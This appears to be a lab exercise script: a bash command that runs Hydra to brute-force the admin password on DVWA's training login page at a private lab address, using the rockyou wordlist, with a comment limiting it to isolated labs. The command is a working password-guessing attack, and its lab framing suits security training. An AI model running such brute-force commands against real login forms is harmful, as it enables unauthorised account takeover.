#!/bin/bash
# WARNING: Use only in your own isolated lab environment.
hydra -l admin \
      -P /usr/share/wordlists/rockyou.txt \
      -s 80 192.168.10.20 \
      http-get-form \
      "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect.:H=Cookie: PHPSESSID=<session>; security=low" \
      -V -f -t 4
